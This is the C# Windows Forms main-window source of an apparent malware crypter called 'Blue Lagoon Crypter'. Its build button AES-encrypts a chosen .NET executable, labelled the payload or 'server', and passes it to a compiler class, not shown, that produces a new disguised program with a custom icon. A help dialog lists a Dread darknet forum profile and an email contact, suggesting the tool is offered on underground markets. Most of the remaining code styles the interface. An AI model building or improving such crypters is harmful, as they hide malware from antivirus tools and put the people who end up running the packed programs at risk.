using Blue_Lagoon_Crypter__Windowed_.Tools;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace Blue_Lagoon_Crypter__Windowed_
{
    public partial class Form1 : Form
    {
        public static Form1 instance;
        public Label lab1;

        private string outputProgramName;
        public string OutputProgramName { get; set; }

        public Form1()
        {
            InitializeComponent();
            instance = this;
            lab1 = OutputNameHolderLabel;
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        #region Main Buttons Functionality
        private void button_build_Click(object sender, EventArgs e)
        {
            try
            {
                byte[] rawData = File.ReadAllBytes(server_path.Text);
                byte[] encRawData = Encryption.AesEncryption(rawData, Convert.FromBase64String(keyGenBox.Text), Convert.FromBase64String(genIvBox.Text));
                string base64Aes = Convert.ToBase64String(encRawData);

                string outputProgramName = Convert.ToString(lab1.Text);

                // Log the Output name
                LogBase64Aes(outputProgramName.ToString());
                // Log the base64Aes string
                LogBase64Aes(base64Aes);

                Compiler compile = new Compiler(base64Aes, keyGenBox.Text, genIvBox.Text, outputProgramName);
                compile.Compile();
                pictureBoxSuccess.Visible = true;
            }
            catch (Exception ex) 
            { 
                Console.WriteLine(ex.Message);
            }
        }

        private void genKey_Click(object sender, EventArgs e)
        {
            byte[] key = Tools.EncryptionConfig.GetKey(16);
            string KeyBase64 = Convert.ToBase64String(key);
            keyGenBox.Text = KeyBase64;
        }

        private void genIV_Click(object sender, EventArgs e)
        {
            byte[] iv = Tools.EncryptionConfig.GetIV(16);
            string IVBase64 = Convert.ToBase64String(iv);
            genIvBox.Text = IVBase64;
        }

        private void button_select_server_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Filter = "Executable (*.exe)|*.exe";
                ofd.Title = "Select .NET File To Crypter...";

                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    server_path.Text = ofd.FileName;
                    Icon fileIcon = Icon.ExtractAssociatedIcon(ofd.FileName);
                    pictureBoxPayload.Image = fileIcon.ToBitmap();
                    pictureBoxPayload.BackColor = Color.White;
                    pictureBoxSuccess.Visible = false;
                }
            }
        }

        private void button_select_icon_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Filter = "Icon (*.ico)|*.ico";
                ofd.Title = "Select Icon...";

                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    icon_path.Text = ofd.FileName;
                    Icon fileIcon = Icon.ExtractAssociatedIcon(ofd.FileName);
                    pictureBoxIcon.Image = fileIcon.ToBitmap();
                    pictureBoxIcon.BackColor = Color.White;
                }
            }
        }
        #endregion

        private void icon_path_label_Click(object sender, EventArgs e)
        {

        }

        private void server_path_TextChanged(object sender, EventArgs e)
        {

        }

        // ///////////////////////////////////////////////////////////////
        #region UI Design Region
        private void button1_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            
        }

        public const int WM_NCLBUTTONDOWN = 0xA1;
        public const int HT_CAPTION = 0x2;

        [DllImportAttribute("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd,
                         int Msg, int wParam, int lParam);
        [DllImportAttribute("user32.dll")]
        public static extern bool ReleaseCapture();

        private void mouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }

        private void mouseEnterPayload(object sender, EventArgs e)
        {
            button_select_server.BackColor = Color.Aqua;
            button_select_server.ForeColor = Color.Black;
        }

        private void mouseLeaverPayload(object sender, EventArgs e)
        {
            button_select_server.BackColor = Color.Black;
            button_select_server.ForeColor = Color.White;
        }

        private void mouseEnterIcon(object sender, EventArgs e)
        {
            button_select_icon.BackColor = Color.Aqua;
            button_select_icon.ForeColor = Color.Black;
        }

        private void mouseLeaveIcon(object sender, EventArgs e)
        {
            button_select_icon.BackColor = Color.Black;
            button_select_icon.ForeColor = Color.White;
        }

        private void mouseEnterGenKey(object sender, EventArgs e)
        {
            genKey.BackColor = Color.Aqua;
            genKey.ForeColor = Color.Black;
        }

        private void mouseLeaveGenKey(object sender, EventArgs e)
        {
            genKey.BackColor = Color.Black;
            genKey.ForeColor = Color.White;
        }

        private void mouseEnterIV(object sender, EventArgs e)
        {
            genIV.BackColor = Color.Aqua;
            genIV.ForeColor = Color.Black;
        }

        private void mouseLeaveIV(object sender, EventArgs e)
        {
            genIV.BackColor = Color.Black;
            genIV.ForeColor = Color.White;
        }

        private void mouseEnterBuild(object sender, EventArgs e)
        {
            button_build.BackColor = Color.Aqua;
            button_build.ForeColor = Color.Black;
            buildHighlight.BackColor = Color.Crimson;
        }

        private void mouseLeaveBuild(object sender, EventArgs e)
        {
            button_build.BackColor = Color.Black;
            button_build.ForeColor = Color.White;
            buildHighlight.BackColor = Color.Black;
        }

        private void mouseEnterExit(object sender, EventArgs e)
        {
            exit_button.ForeColor = Color.White;
            exit_button.BackColor = Color.Black;
        }

        private void mouseLeaveExit(object sender, EventArgs e)
        {
            exit_button.ForeColor = Color.Black;
            exit_button.BackColor = Color.Transparent;
        }

        private void mouseClickHelp(object sender, EventArgs e)
        {
            MessageBox.Show("My Dread profile:\n\nhttp://g66ol3eb5ujdckzqqfmjsbpdjufmjd5nsgdipvxmsh7rckzlhywlzlqd.onion/u/globalxboyprod/\n\n\nEmail me on:\n\nglobalx.cryptbb@proton.me");
        }

        private void mouseEnterHelp(object sender, EventArgs e)
        {
            help_button.ForeColor = Color.White;
            help_button.BackColor = Color.Black;
        }

        private void mouseLeaveHelp(object sender, EventArgs e)
        {
            help_button.ForeColor= Color.Black;
            help_button.BackColor = Color.Transparent;
        }

        private void pictureBoxPayload_Click(object sender, EventArgs e)
        {

        }

        private void topLogoBLC_WIP_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start("https://github.com/lxcalbxy/Blue-Lagoon-Crypter.git");
        }

        private void blueLagoonCryptEnter(object sender, EventArgs e)
        {
            blueLagoonCryptHighlight.BackColor = Color.Crimson;
        }

        private void blueLagoonCryptLeave(object sender, EventArgs e)
        {
            blueLagoonCryptHighlight.BackColor = Color.Black;
        }

        private void button_OpenNameForm_Click(object sender, EventArgs e)
        {
            // Open Naming Form Window
            Output_Name_Text_Form openNamingForm = new Output_Name_Text_Form();

            openNamingForm.Show();
        }

        private void windowPanel_Paint(object sender, PaintEventArgs e)
        {

        }
        #endregion
        private void LogBase64Aes(string base64Aes)
        {
            try
            {
                using (StreamWriter writer = new StreamWriter("logging_Form1.txt", true))
                {
                    string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                    writer.WriteLine(timestamp);

                    writer.WriteLine("\n\n\n" + base64Aes + "\n\n\n");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error logging base64Aes: " + ex.Message);
            }
        }

        private void OutputNameHolderLabel_Click(object sender, EventArgs e)
        {

        }
    }
}